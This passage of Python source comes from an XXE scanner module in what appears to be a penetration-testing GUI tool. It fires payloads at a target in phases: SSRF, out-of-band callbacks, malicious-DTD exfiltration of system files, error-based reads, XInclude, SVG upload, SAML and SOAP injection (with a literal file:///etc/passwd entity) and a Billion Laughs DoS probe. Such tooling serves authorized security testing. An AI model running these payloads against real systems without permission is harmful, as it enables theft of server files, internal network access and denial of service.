        # request or it doesn't, regardless of which XML tag carried the payload.
        # Once a target is confirmed via any tag, the remaining tags for that
        # target are skipped — they would produce identical findings.
        #
        # Within a target we still try all tags until one confirms, because
        # some endpoints only reflect the entity value from specific tags.
        for target in _SSRF_TARGETS:
            if not self.running:
                break
            target_confirmed = False
            for tag in leaf_tags:
                if not self.running:
                    break
                if target_confirmed:
                    self.scan_progress.emit(
                        f"  ⏭  {target} already confirmed — skipping <{tag}>"
                    )
                    continue
                hit = self._xxe_fire(
                    url, method, headers,
                    _inject_entity_into_body(body, target, tag),
                    ct, baseline, results,
                    phase="xxe_ssrf",
                    note=f"SSRF {target} into <{tag}>",
                    # Network errors confirm the server made an outbound request.
                    # ConnectException = TCP attempt made = real SSRF.
                    # UnknownHostException = DNS lookup performed = real SSRF.
                    sigs=_P2_SIGS,
                )
                if hit and hit.get("confidence") == "HIGH":
                    target_confirmed = True
                    if stop_on_first:
                        results["stats"]["phases_run"].append("xxe_ssrf")
                        return
        results["stats"]["phases_run"].append("xxe_ssrf")

    def _xxe_p3_blind_oob(self, url, method, headers, body, ct, baseline, results, oast):
        self.scan_progress.emit(f"\n📡 Phase 3 — Blind OOB (regular entity) → {oast}")
        leaf_tags = self._xxe_xml_tags(body)
        for tag in leaf_tags:
            if not self.running:
                break
            self._xxe_fire(
                url, method, headers,
                _inject_entity_into_body(body, f"http://{oast}/xxe-p3-{tag}", tag),
                ct, baseline, results,
                phase="blind_oob",
                note=f"OOB HTTP → {oast} into <{tag}>",
                sigs=[],
                is_oob=True,
            )
        results["stats"]["phases_run"].append("blind_oob")

    def _xxe_p4_param_entity(self, url, method, headers, body, ct, baseline, results, oast):
        self.scan_progress.emit(
            "\n📡 Phase 4 — Blind XXE via XML Parameter Entities\n"
            "  ℹ️  WHY: When regular entities (&xxe;) are blocked by input validation\n"
            "     or a hardened XML parser, XML parameter entities (% syntax) may\n"
            "     still be processed. Parameter entities can only appear in the DTD\n"
            "     itself — not in the document body — which lets them bypass filters\n"
            "     that only sanitise element/attribute content.\n"
            "  Payload shape:  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"URL\"> %xxe; ]>\n"
            "  Detection:      parser tries to fetch URL → DNS/HTTP interaction or\n"
            "                  network error leaks into the response."
        )

        # ── WHY two variants per sub-phase? ────────────────────────────────
        # Some parsers validate the document body against a schema BEFORE
        # processing the DOCTYPE.  Sending DOCTYPE-only (no body) may be
        # rejected immediately.  Sending DOCTYPE + original body keeps the
        # document structurally valid and gives the parser a chance to resolve
        # the % entity.  We send BOTH so neither case is missed.

        # ── 4a: No-OAST detection (always runs) ─────────────────────────────
        self.scan_progress.emit(
            "  ▶  4a: % entity → bogus host (no OAST needed)\n"
            "     Firing twice: [1] DOCTYPE + original body  [2] DOCTYPE only"
        )
        # 4a-1: DOCTYPE + original body (PRIMARY)
        self._xxe_fire(
            url, method, headers,
            _p_param_entity_no_oast(body),
            ct, baseline, results,
            phase="param_entity_detect",
            note="% param entity → bogus host (DOCTYPE + original body)",
            sigs=_P4_SIGS,
        )
        if self.running:
            # 4a-2: DOCTYPE only (FALLBACK)
            self._xxe_fire(
                url, method, headers,
                _p_param_entity_no_oast(),
                ct, baseline, results,
                phase="param_entity_detect",
                note="% param entity → bogus host (DOCTYPE only)",
                sigs=_P4_SIGS,
            )

        # ── 4b: OOB confirmation (only when OAST URL configured) ────────────
        if oast:
            self.scan_progress.emit(
                f"  ▶  4b: % entity → OAST {oast} (watch interactsh)\n"
                "     Firing twice: [1] DOCTYPE + original body  [2] DOCTYPE only"
            )
            # 4b-1: DOCTYPE + original body (PRIMARY)
            self._xxe_fire(
                url, method, headers,
                _p_param_entity(oast, body),
                ct, baseline, results,
                phase="param_entity_oob",
                note=f"% param entity OOB → {oast} (DOCTYPE + original body)",
                sigs=_P4_SIGS,
                is_oob=True,
            )
            if self.running:
                # 4b-2: DOCTYPE only (FALLBACK)
                self._xxe_fire(
                    url, method, headers,
                    _p_param_entity(oast),
                    ct, baseline, results,
                    phase="param_entity_oob",
                    note=f"% param entity OOB → {oast} (DOCTYPE only)",
                    sigs=_P4_SIGS,
                    is_oob=True,
                )
        else:
            self.scan_progress.emit(
                "  ⏭  4b: OOB callback skipped — no OAST URL configured\n"
                "     (configure interactsh URL to enable DNS-callback confirmation)"
            )

        results["stats"]["phases_run"].append("param_entity_oob")

    def _xxe_p5_oob_exfil(self, url, method, headers, body, ct, baseline, results, oast):
        self.scan_progress.emit(
            f"\n📤 Phase 5 — Blind OOB Exfiltration via Malicious DTD → {oast}\n"
            "  Each file is tried twice:\n"
            "  [1] DOCTYPE + original body  ← primary: keeps document valid for\n"
            "      schema-validating parsers that reject bodyless requests\n"
            "  [2] DOCTYPE only             ← fallback: for parsers that strip body"
        )
        for fpath in _LFI_UNIX[:3]:
            if not self.running:
                break
            # 1: DOCTYPE + original body (PRIMARY — sent first)
            self._xxe_fire(
                url, method, headers,
                _p_oob_exfil(oast, body),
                ct, baseline, results,
                phase="oob_exfil",
                note=f"Exfil {fpath} via malicious.dtd (DOCTYPE + original body)",
                sigs=[],
                is_oob=True,
            )
            if not self.running:
                break
            # 2: DOCTYPE only (FALLBACK)
            self._xxe_fire(
                url, method, headers,
                _p_oob_exfil(oast),
                ct, baseline, results,
                phase="oob_exfil",
                note=f"Exfil {fpath} via malicious.dtd (DOCTYPE only)",
                sigs=[],
                is_oob=True,
            )
        results["stats"]["phases_run"].append("oob_exfil")

    def _xxe_p6_error_based(self, url, method, headers, body, ct, baseline, results):
        self.scan_progress.emit("\n💥 Phase 6 — Error-Based XXE (Parser Error Exfiltration)")
        got_blocked_response = False
        for fpath in _LFI_ALL[:6]:
            if not self.running:
                break
            if got_blocked_response:
                self.scan_progress.emit(
                    f"  ⏭  Skipping {fpath} — server blocks all entities (already recorded)"
                )
                continue
            hit = self._xxe_fire(
                url, method, headers,
                _p_error_based(fpath),
                ct, baseline, results,
                phase="error_based",
                note=f"error → {fpath}",
                # Include blocked-entity responses: "Entities are not allowed"
                # confirms the parser saw the DOCTYPE — useful for fingerprinting.
                sigs=_P6_SIGS,
            )
            # One blocked-entity finding is enough — all files give the same response.
            if hit and hit.get("confidence") == "MEDIUM":
                got_blocked_response = True
        results["stats"]["phases_run"].append("error_based")

    def _xxe_p7_local_dtd(self, url, method, headers, body, ct, baseline, results):
        self.scan_progress.emit(
            "\n🗂️  Phase 7 — Local DTD Repurposing (No OOB Required)"
        )
        # Track whether we already got a "blocked entity" response. If so,
        # every subsequent DTD will return the same thing — stop early to avoid
        # flooding results with 21 identical MEDIUM findings that all say
        # "Entities are not allowed for security reasons".
        got_blocked_response = False

        for dtd_path, ent_name in _LOCAL_DTDS:
            if not self.running:
                break
            if got_blocked_response:
                self.scan_progress.emit(
                    f"  ⏭  Skipping {dtd_path} — server blocks all entities (already recorded)"
                )
                continue
            for fpath in _LFI_UNIX[:3]:
                if not self.running:
                    break
                hit = self._xxe_fire(
                    url, method, headers,
                    _p_local_dtd(dtd_path, ent_name, fpath),
                    ct, baseline, results,
                    phase="local_dtd_repurpose",
                    note=f"LocalDTD:{dtd_path} ent:{ent_name} → {fpath}",
                    sigs=_P6_SIGS,
                )
                # If we got a MEDIUM blocked-entity finding, record it once
                # and skip all remaining DTD paths — they'll all say the same thing.
                if hit and hit.get("confidence") == "MEDIUM":
                    got_blocked_response = True
                    break
                # If we got a HIGH finding (actual file read), keep scanning.
        results["stats"]["phases_run"].append("local_dtd_repurpose")

    def _xxe_p8_xinclude(self, url, method, headers, body, ct, baseline, results,
                         is_form: bool = False):
        self.scan_progress.emit("\n🔗 Phase 8 — XInclude Attack (No DOCTYPE Control)")
        stop_on_first = getattr(self, "scan_stop_on_first", False)
        leaf_tags     = self._xxe_xml_tags(body)

        for fpath in _LFI_ALL[:5]:
            if not self.running:
                break

            # ── Strategy A: inject xi:include directly into each XML leaf tag ──
            # Used when the body is already XML.  Preserves full document structure
            # so the server can route the request and echo file content back.
            #
            # Correct payload for <productId>:
            #   <stockCheck>
            #     <productId xmlns:xi="..."><xi:include parse="text" href="file:///..."/></productId>
            #     <storeId>1</storeId>
            #   </stockCheck>
            for tag in leaf_tags:
                if not self.running:
                    break
                payload = _p_xinclude_in_tag(body, tag, fpath)
                if not payload:
                    continue
                hit = self._xxe_fire(
                    url, method, headers, payload, ct, baseline, results,
                    phase="xinclude",
                    note=f"XInclude in <{tag}> (XML body) → {fpath}",
                    # File content + file-access errors only.
                    # Generic XML parse errors ("Unexpected 'u'", etc.) are NOT
                    # XInclude evidence — they mean the xi:include syntax was
                    # rejected as invalid XML, not that file content was read.
                    # The anomaly threshold is also higher for XInclude (100b)
                    # because the xi:include tag itself adds ~47b of overhead.
                    sigs=_P8_SIGS,
                    xinclude_mode=True,
                )
                if hit and hit.get("confidence") == "HIGH" and stop_on_first:
                    results["stats"]["phases_run"].append("xinclude")
                    return

            # ── Strategy B: replace entire body with standalone xi wrapper ──
            # Works when the endpoint accepts any XML (not structure-dependent).
            # Sends: <foo xmlns:xi="..."><xi:include parse="text" href="..."/></foo>
            if self._xxe_is_xml(body, ct):
                hit = self._xxe_fire(
                    url, method, headers, _p_xinclude(fpath), ct, baseline, results,
                    phase="xinclude",
                    note=f"XInclude standalone XML body → {fpath}",
                    sigs=_P8_SIGS,
                    xinclude_mode=True,
                )
                if hit and hit.get("confidence") == "HIGH" and stop_on_first:
                    results["stats"]["phases_run"].append("xinclude")
                    return

            # ── Strategy C: inject into form-urlencoded parameter value ──────
            # The ORIGINAL technique for XInclude on form bodies (PortSwigger lab).
            # The request stays application/x-www-form-urlencoded — we must NOT
            # change Content-Type.  The xi:include element is URL-encoded and
            # substituted as the value of each form parameter.
            #
            # The server parses the form body normally and passes the parameter
            # value into an XML parser internally.  The xi:include triggers there.
            #
            # Example:
            #   productId=<foo xmlns:xi="...">[xi:include.../]</foo>&storeId=1
            #
            # This is the ONLY strategy that works when the original request is
            # application/x-www-form-urlencoded, because Strategies A and B both
            # send an XML body which the server rejects at the routing layer.
            if is_form:
                form_params = [k for k, v in urllib.parse.parse_qsl(
                    body, keep_blank_values=True
                )]
                for param in form_params:
                    if not self.running:
                        break
                    form_payload = _p_xinclude_in_form_param(body, param, fpath)
                    if not form_payload:
                        continue
                    # Keep original headers including Content-Type: form-urlencoded
                    hit = self._xxe_fire(
                        url, method, headers, form_payload, ct, baseline, results,
                        phase="xinclude",
                        note=f"XInclude in form param [{param}] → {fpath}",
                        sigs=_P8_SIGS,
                        xinclude_mode=True,
                    )
                    if hit and hit.get("confidence") == "HIGH" and stop_on_first:
                        results["stats"]["phases_run"].append("xinclude")
                        return

        results["stats"]["phases_run"].append("xinclude")

    def _xxe_p9_ct_conversion(self, url, method, headers, body, ct, baseline, results):
        self.scan_progress.emit(
            "\n🔄 Phase 9 — Content-Type Conversion (JSON/Form → text/xml)"
        )
        xml_base = _body_to_xml(body, ct)
        if not xml_base:
            self.scan_progress.emit("  ⏭  Cannot convert body to XML — skipping.")
            results["stats"]["phases_run"].append("ct_conversion")
            return

        xml_hdrs = dict(headers)
        xml_hdrs["Content-Type"] = "text/xml"

        for fpath in _LFI_ALL[:5]:
            if not self.running:
                break
            # Inject XXE DOCTYPE into the converted XML envelope
            # Strip the original xml declaration from xml_base first
            xml_body_no_decl = re.sub(r'<\?xml[^?]*\?>\s*', '', xml_base, count=1)
            xxe_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file://{f}"> ]>\n'
                '{base}'
            ).format(f=fpath, base=xml_body_no_decl)

            self._xxe_fire(
                url, method, xml_hdrs, xxe_xml, "text/xml",
                baseline, results,
                phase="ct_conversion",
                note=f"CT:text/xml conversion → {fpath}",
                sigs=_FILE_SIGS,
            )
        results["stats"]["phases_run"].append("ct_conversion")

    def _xxe_p10_svg_upload(self, url, method, headers, body, ct, baseline, results):
        self.scan_progress.emit("\n🖼️  Phase 10 — SVG File Upload XXE")
        self.scan_progress.emit(
            "  ℹ️  HOW TO READ RESULTS: This phase uploads a malicious SVG that\n"
            "     embeds a local file via an XXE entity.  The file content will NOT\n"
            "     appear in the HTTP response — it is rendered INSIDE the SVG image.\n"
            "     To confirm exploitation:\n"
            "       1. After each request below, navigate to the URL where the\n"
            "          uploaded SVG can be viewed (e.g. /uploads/evil.svg).\n"
            "       2. View the SVG source (Ctrl+U) or open DevTools → Network.\n"
            "       3. The content of the target file (e.g. /etc/hosts) should\n"
            "          appear as text rendered inside the <text> element of the SVG.\n"
            "     Tip: a successful hit looks like:\n"
            "       <text>127.0.0.1 localhost\n"
            "       ::1 localhost ip6-localhost...\n"
            "       </text>"
        )

        # Build a files= dict from parsed body_params so we don't send
        # corrupted binary data.  Text fields are sent as-is; the target
        # file field is replaced with our malicious SVG.
        try:
            from scanner_tab import _parse_request_components as _prc
            _, _, _, _, _, body_params, _ = _prc(self.request_data)
        except Exception:
            body_params = {}

        # Find the file field name (first field with FILE: marker)
        file_field = None
        for field, vals in body_params.items():
            if vals and vals[0].startswith("FILE:"):
                file_field = field
                break

        for fpath in _LFI_ALL[:5]:
            if not self.running:
                break
            svg = _p_svg(fpath)

            if body_params and file_field:
                # Reconstruct multipart via files= API (correct binary handling)
                files_dict = {}
                for field, vals in body_params.items():
                    val = vals[0] if vals else ""
                    if field == file_field:
                        files_dict[field] = ("evil.svg", svg.encode(), "image/svg+xml")
                    elif val.startswith("FILE:"):
                        fname = val[5:] or "file.bin"
                        files_dict[field] = (fname, b"\x00", "application/octet-stream")
                    else:
                        files_dict[field] = (None, val)
                svg_hdrs = {k: v for k, v in headers.items()
                            if k.lower() not in ("host", "accept-encoding", "content-type")}
                self._xxe_fire(
                    url, method, svg_hdrs, "", ct,
                    baseline, results,
                    phase="svg_upload",
                    note=f"SVG upload → {fpath}",
                    sigs=_FILE_SIGS,
                    files=files_dict,
                )
                self.scan_progress.emit(
                    f"  👁️  SVG uploaded targeting {fpath}\n"
                    f"     → Navigate to the uploaded SVG in your browser and view\n"
                    f"       its source to check if {fpath} content is embedded."
                )
            else:
                # Fallback: rebuild body string (no binary file fields present)
                new_body, new_ct = self._xxe_build_svg_multipart(body, ct, svg)
                if new_body is None:
                    self.scan_progress.emit(
                        "  ⏭  Cannot build SVG multipart — skipping Phase 10."
                    )
                    break
                svg_hdrs = dict(headers)
                svg_hdrs["Content-Type"] = new_ct
                self._xxe_fire(
                    url, method, svg_hdrs, new_body, new_ct,
                    baseline, results,
                    phase="svg_upload",
                    note=f"SVG upload → {fpath}",
                    sigs=_FILE_SIGS,
                )
                self.scan_progress.emit(
                    f"  👁️  SVG uploaded targeting {fpath}\n"
                    f"     → Navigate to the uploaded SVG in your browser and view\n"
                    f"       its source to check if {fpath} content is embedded."
                )
        results["stats"]["phases_run"].append("svg_upload")

    def _xxe_p11_saml(self, url, method, headers, body, ct, baseline, results):
        """Phase 11 — SAML/SSO injection (only fires when SAML indicators present)."""
        is_saml = (
            "saml" in url.lower() or "sso" in url.lower()
            or "SAMLResponse" in (body or "")
            or "SAMLRequest" in (body or "")
        )
        if not is_saml:
            self.scan_progress.emit(
                "\n⏭️  Phase 11  SAML/SSO skipped — no SAML indicators detected"
            )
            results["stats"]["phases_run"].append("saml_sso")
            return

        self.scan_progress.emit("\n🔐 Phase 11 — SAML / SSO XXE Injection")
        for fpath in _LFI_ALL[:3]:
            if not self.running:
                break
            saml_xml = _p_saml(fpath)

            # (a) Raw XML body
            h_xml = dict(headers)
            h_xml["Content-Type"] = "text/xml"
            self._xxe_fire(
                url, method, h_xml, saml_xml, "text/xml",
                baseline, results,
                phase="saml_sso",
                note=f"SAML AuthnRequest XML → {fpath}",
                sigs=_FILE_SIGS,
            )

            # (b) Form-encoded SAMLRequest parameter
            h_form = dict(headers)
            h_form["Content-Type"] = "application/x-www-form-urlencoded"
            form_body = "SAMLRequest=" + urllib.parse.quote(saml_xml)
            self._xxe_fire(
                url, method, h_form, form_body,
                "application/x-www-form-urlencoded",
                baseline, results,
                phase="saml_sso",
                note=f"SAML form-encoded → {fpath}",
                sigs=_FILE_SIGS,
            )
        results["stats"]["phases_run"].append("saml_sso")

    def _xxe_p12_billion_laughs(self, url, method, headers, body, ct, baseline, results):
        self.scan_progress.emit("\n💣 Phase 12 — Billion Laughs / Entity Expansion DoS Probe")
        self._xxe_fire(
            url, method, headers,
            _p_billion_laughs(),
            ct, baseline, results,
            phase="billion_laughs",
            note="Billion Laughs (lol9 expansion)",
            sigs=_DOS_SIGS,
            short_timeout=True,
        )
        results["stats"]["phases_run"].append("billion_laughs")

    def _xxe_p13_soap(self, url, method, headers, baseline, results):
        self.scan_progress.emit("\n🧼 Phase 13 — SOAP Endpoint Discovery + XXE Probe")
        parsed = urllib.parse.urlparse(url)
        base   = f"{parsed.scheme}://{parsed.netloc}"
        soap_xml = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE soap [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
            '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
            '  <soap:Body>&xxe;</soap:Body>\n'
            '</soap:Envelope>'
        )
        h = dict(headers)
        h["Content-Type"] = "text/xml; charset=utf-8"
        h["SOAPAction"]   = '""'
        for path in _SOAP_PATHS:
            if not self.running:
                break
            self._xxe_fire(
                base + path, "POST", h, soap_xml, "text/xml",
                baseline, results,
                phase="soap_discovery",
                note=f"SOAP probe → {base}{path}",
                sigs=_P13_SIGS,
            )
        results["stats"]["phases_run"].append("soap_discovery")

    # =========================================================================
    # CORE FIRE METHOD
    # =========================================================================

    def _xxe_fire(
        self,
        url: str,
        method: str,
        headers: Dict,
        payload_xml: str,
        ct: str,
        baseline: Dict,
        results: Dict,
        phase: str,
        note: str,
        sigs: List,
        is_oob: bool = False,
        short_timeout: bool = False,
        xinclude_mode: bool = False,
        files: Optional[Dict] = None,
    ) -> Optional[Dict]:
        """
        Send one XXE payload and evaluate the response.

        Detection is PURELY TEXT-BASED — status codes are NEVER checked.
        A confirmed XXE can return 200, 400, 500, or any code depending on how
        the application handles the injected entity value.

        Two detection paths (in order):
          1. Signature match (HIGH)  — regex over resp.text for known file content
             or XML parser error strings. Fires on any status code.
          2. Length anomaly  (MEDIUM) — resp.text grew significantly vs baseline,
             suggesting file content was injected even without a specific signature.
             Standard threshold: delta >= 50b OR (baseline <= 10b AND resp >= 50b).
             XInclude mode raises threshold to 100b because xi:include syntax adds
             ~47b of XML overhead that would otherwise cause false anomalies.

        Every request emits a log line BEFORE any detection logic runs,
        so the log always shows exactly what was sent and received.
        Errors from send_request_with_traffic are also emitted (never silent).
        """
        results["stats"]["payloads_tested"] += 1

        # ── Build headers ─────────────────────────────────────────────────────
        send_hdrs = {k: v for k, v in headers.items()
                     if k.lower() != "accept-encoding"}
        # Accept-Encoding is stripped so requests negotiates gzip/deflate itself.
        # Forwarding the original "gzip, deflate, br, zstd" lets the server pick
        # Brotli (br). Without brotlipy, requests raises ContentDecodingError on
        # br responses → the exception is swallowed and resp.text is lost.

        if not any(k.lower() == "content-type" for k in send_hdrs):
            send_hdrs["Content-Type"] = ct or "application/xml"

        # ── Send ──────────────────────────────────────────────────────────────
        # send_request_with_traffic never raises (it returns ErrorResponse on
        # failure), but wrap anyway as a safety net.
        resp        = None
        resp_text   = ""
        resp_status = 0
        resp_len    = 0

        try:
            resp = self.send_request_with_traffic(
                url, send_hdrs,
                method=method,
                body="" if files else payload_xml,
                files=files,
                payload=note,
                payload_type=f"XXE-{phase}",
            )

            resp_status = getattr(resp, "status_code", 0) or 0
            resp_text   = getattr(resp, "text",        "") or ""

            # Manual decompression fallback: if resp.text is empty but
            # resp.content has bytes, try gzip/zlib decode ourselves.
            # This handles edge cases where requests skips auto-decompression
            # (e.g. when Content-Encoding is present but resp.text is blank).
            if not resp_text:
                raw = getattr(resp, "content", b"") or b""
                if raw:
                    try:
                        import gzip as _gz
                        resp_text = _gz.decompress(raw).decode("utf-8", errors="replace")
                    except Exception:
                        try:
                            import zlib as _zl
                            resp_text = _zl.decompress(raw, 16 + _zl.MAX_WBITS).decode("utf-8", errors="replace")
                        except Exception:
                            resp_text = raw.decode("utf-8", errors="replace")

            # Use decoded text length — never resp.content (compressed wire bytes).
            resp_len = len(resp_text.encode("utf-8", errors="replace"))

        except Exception as exc:
            # Surface the error visibly — no silent swallowing.
            self.scan_progress.emit(
                f"  ❌ [{phase}] REQUEST ERROR: {note[:60]} — {exc}"
            )
            return None

        # ── Per-request log line (always visible) ─────────────────────────────
        # This fires for EVERY attempt regardless of what comes next.
        # Seeing this line in the log confirms the request was sent and a
        # response was received/decoded.
        self.scan_progress.emit(
            f"  → [{phase}] {note[:80]}  "
            f"HTTP {resp_status}  {resp_len}b  "
            f"snippet: {repr(resp_text[:100])}"
        )

        # ── OOB: just record, do not evaluate ─────────────────────────────────
        if is_oob:
            finding = {
                "phase":       phase,
                "note":        note,
                "payload":     payload_xml[:200],
                "status_code": resp_status,
                "length":      resp_len,
                "matched_sig": "OOB_BLIND — check interactsh/collaborator",
                "confidence":  "INFO",
                "url":         url,
                "snippet":     "",
            }
            results["details"].append(finding)
            return finding

        # ── Detection Path 1: Signature match ────────────────────────────────
        # Search resp.text for known file content patterns or XML parser errors.
        # Status code is completely ignored — match fires on 200, 400, 500, etc.
        #
        # Confidence rules:
        #   HIGH   — actual file content or parser proved it accessed the file
        #            (FileNotFoundException, IOException, SAXParseException, etc.)
        #   MEDIUM — server security filter blocked the entity but confirmed it
        #            SAW the DOCTYPE ("Entities are not allowed for security reasons").
        #            No file was read, no SSRF occurred — this is intelligence about
        #            the server's security posture, not a confirmed exploit.
        matched_sig   = None
        matched_is_block = False
        for sig in sigs:
            try:
                m = sig.search(resp_text)
                if m:
                    matched_sig = m.group(0)[:100]
                    # Check if this match came from _BLOCKED_SIGS specifically
                    matched_is_block = any(
                        sig is bs for bs in _BLOCKED_SIGS
                    )
                    break
            except Exception:
                continue

        if matched_sig:
            confidence = "MEDIUM" if matched_is_block else "HIGH"
            icon       = "🔒 ENTITY BLOCKED" if matched_is_block else "🎯 XXE CONFIRMED"
            self.scan_progress.emit(
                f"  {icon} [{phase}]  {note}\n"
                f"      MATCHED: '{matched_sig}'\n"
                f"      HTTP {resp_status}  {resp_len}b"
            )
            finding = {
                "phase":       phase,
                "note":        note,
                "payload":     payload_xml[:400],
                "status_code": resp_status,
                "length":      resp_len,
                "matched_sig": matched_sig,
                "confidence":  confidence,
                "url":         url,
                "snippet":     resp_text[:500],
            }
            if not matched_is_block:
                results["vulnerable"] = True
                results["stats"]["vulnerabilities"] += 1
            results["details"].append(finding)
            return finding

        # ── Detection Path 2: Length anomaly (MEDIUM confidence) ──────────────
        # A response that is meaningfully LARGER than the baseline suggests file
        # content was injected, even if we don't have a specific signature for it.
        #
        # Two independent triggers (either fires the finding):
        #
        #   (a) Response grew by ≥ threshold bytes vs baseline (absolute).
        #       Standard threshold = 50b.
        #       XInclude threshold = 100b: xi:include syntax itself adds ~47b of
        #       XML overhead that shifts the response size even on pure parse errors,
        #       so we need a higher bar to avoid false anomalies.
        #
        #   (b) Baseline is tiny (≤ 10b) AND response is ≥ threshold.
        #       Catches the common PortSwigger-style case:
        #         baseline = "896"  (3b stock count)
        #         payload  = "Invalid product ID: root:x:..." (large)
        #
        # Negative filter: suppress anomaly when the response is just a Java
        # network error caused by the parser treating a Windows drive letter
        # (file://c:/...) as a hostname (UnknownHostException: c).
        # These responses are larger than the baseline but contain no file
        # content and are not SSRF evidence — they're a parser quirk on Linux.
        # We check for UnknownHostException with a single-character host, which
        # is the exact signature of a drive-letter-as-hostname error.
        #
        # Status codes are NEVER part of these checks.
        #
        _NETWORK_QUIRK = re.compile(
            r"UnknownHostException:\s+[a-zA-Z]\b",  # single-letter host = drive letter
            re.IGNORECASE,
        )
        if _NETWORK_QUIRK.search(resp_text):
            return None  # Windows path on Linux server — parser quirk, not XXE evidence

        anomaly_threshold = 100 if xinclude_mode else 50
        baseline_len = baseline.get("length", 0)
        delta        = resp_len - baseline_len   # signed; positive = grew

        trigger_a = delta >= anomaly_threshold
        trigger_b = (baseline_len <= 10) and (resp_len >= anomaly_threshold)

        if trigger_a or trigger_b:
            reasons = []
            if trigger_a: reasons.append(f"response grew +{delta}b vs baseline")
            if trigger_b: reasons.append(f"baseline={baseline_len}b → payload={resp_len}b")
            self.scan_progress.emit(
                f"  📊 LENGTH ANOMALY [{phase}]  {note}\n"
                f"      {' | '.join(reasons)}  HTTP {resp_status}"
            )
            finding = {
                "phase":       phase,
                "note":        note,
                "payload":     payload_xml[:400],
                "status_code": resp_status,
                "length":      resp_len,
                "matched_sig": f"LENGTH ANOMALY: baseline={baseline_len}b → {resp_len}b (Δ{delta:+d}b)",
                "confidence":  "MEDIUM",
                "url":         url,
                "snippet":     resp_text[:300],
            }
            results["details"].append(finding)
            return finding

        return None

    # =========================================================================
    # HELPERS
    # =========================================================================

    def _xxe_parse_request(self) -> Tuple[str, str, Dict, str, str]:
        """Extract url, method, headers, body, content_type from request_data."""
        full_url     = self.request_data.get("url", "")
        request_text = self.request_data.get("request_text", "")
        lines        = request_text.split("\n")

        method = "POST"
        if lines:
            fl = lines[0].strip().upper()
            for m in ("POST", "PUT", "PATCH", "GET", "DELETE"):
                if fl.startswith(m):
                    method = m
                    break

        headers: Dict[str, str] = {}
        body         = ""
        content_type = ""

        for idx, line in enumerate(lines[1:], 1):
            stripped = line.strip()
            if not stripped:
                body = "\n".join(lines[idx + 1:])
                break
            if ":" in line:
                k, v = line.split(":", 1)
                k, v = k.strip(), v.strip()
                headers[k] = v
                if k.lower() == "content-type":
                    content_type = v

        return full_url, method, headers, body, content_type

    def _xxe_baseline(self, url: str, method: str,
                       headers: Dict, body: str) -> Optional[Dict]:
        """Send the unmodified request and record baseline metrics.

        For multipart/form-data requests the raw body string is corrupted
        (binary file bytes mangled through Qt toPlainText / UTF-8 decoding).
        Sending that broken string causes a 400 and aborts the scan.
        We detect multipart, parse the text/file fields, and reconstruct a
        clean request via requests' files= API with a 1-byte placeholder
        for any binary file field.
        """
        # Strip Host and Accept-Encoding as usual.
        clean = {k: v for k, v in headers.items()
                 if k.lower() not in ("host", "accept-encoding")}

        # ── Multipart reconstruction ──────────────────────────────────────
        files_dict = None
        ct_lower = ""
        for k, v in headers.items():
            if k.lower() == "content-type":
                ct_lower = v.lower()
                break

        if "multipart/form-data" in ct_lower:
            try:
                from scanner_tab import _parse_request_components as _prc
                _, _, _, _, _, body_params, _ = _prc(self.request_data)
                if body_params:
                    files_dict = {}
                    for field, vals in body_params.items():
                        val = vals[0] if vals else ""
                        if val.startswith("FILE:"):
                            fname = val[5:] or "file.bin"
                            # 1-byte placeholder so the field exists
                            files_dict[field] = (fname, b"\x00", "application/octet-stream")
                        else:
                            files_dict[field] = (None, val)
                    # Strip Content-Type so requests sets its own boundary
                    clean = {k: v for k, v in clean.items()
                             if k.lower() != "content-type"}
            except Exception as _mp_err:
                logger.debug("XXE multipart baseline reconstruction: %s", _mp_err)
                files_dict = None
        # ─────────────────────────────────────────────────────────────────

        try:
            start = time.time()
            resp  = self.send_request_with_traffic(
                url, clean,
                method=method,
                body="" if files_dict else body,
                files=files_dict,
                payload="[BASELINE]",
                payload_type="XXE-Baseline",
            )
            elapsed = round(time.time() - start, 3)
            if resp and hasattr(resp, "status_code"):
                resp_text = getattr(resp, "text", "") or ""
                if not resp_text:
                    raw = getattr(resp, "content", b"") or b""
                    if raw:
                        try:
                            import gzip as _gzip
                            resp_text = _gzip.decompress(raw).decode("utf-8", errors="replace")
                        except Exception:
                            try:
                                import zlib as _zlib
                                resp_text = _zlib.decompress(raw, 16 + _zlib.MAX_WBITS).decode("utf-8", errors="replace")
                            except Exception:
                                resp_text = raw.decode("utf-8", errors="replace")
                return {
                    "status": getattr(resp, "status_code", 0),
                    "length": len(resp_text.encode("utf-8", errors="replace")),
                    "time":   elapsed,
                    "text":   resp_text[:200],   # stored for diagnostics
                }
        except Exception as exc:
            logger.warning("XXE baseline error: %s", exc)
        return None

    def _xxe_is_xml(self, body: str, ct: str) -> bool:
        """Return True when body/content-type indicates XML."""
        ct_l = (ct or "").lower()
        if any(x in ct_l for x in ("xml", "soap", "text/xml")):
            return True
        s = (body or "").strip()
        return s.startswith("<?xml") or s.startswith("<!DOCTYPE") or s.startswith("<!")

    def _xxe_has_upload(self, body: str, headers: Dict) -> bool:
        """Return True when request contains a multipart file upload."""
        ct = ""
        for k, v in headers.items():
            if k.lower() == "content-type":
                ct = v.lower()
                break
        return "multipart/form-data" in ct or "filename=" in (body or "").lower()

    def _xxe_xml_tags(self, body: str) -> List[str]:
        """
        Return the names of every LEAF element in the XML body — i.e. elements
        whose content is plain text (not child elements).  These are the only
        valid injection points for XXE entity substitution.

        For:  <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
        Returns: ["productId", "storeId"]   (NOT "stockCheck" — it has children)

        Falls back to generic placeholder names if the body is not XML or has
        no detectable leaf elements.
        """
        leaf_tags: List[str] = []
        try:
            # Match any element whose content is plain text (no < inside)
            # <tagName ...>text content</tagName>  — text has no < character
            for m in re.finditer(
                r'<([A-Za-z][A-Za-z0-9_:-]*)(?:\s[^>]*)?>'   # opening tag
                r'([^<]*)'                                      # text content (no nested tags)
                r'</[A-Za-z][A-Za-z0-9_:-]*>',                 # closing tag
                body or ""
            ):
                name = m.group(1)
                # Only include if the text content is non-empty (skip truly empty elements)
                if m.group(2).strip() and name not in leaf_tags:
                    leaf_tags.append(name)
        except Exception:
            pass
        # Limit to avoid combinatorial explosion with many leaf nodes
        return leaf_tags[:8] or ["productId", "userId", "id", "data", "value", "input"]

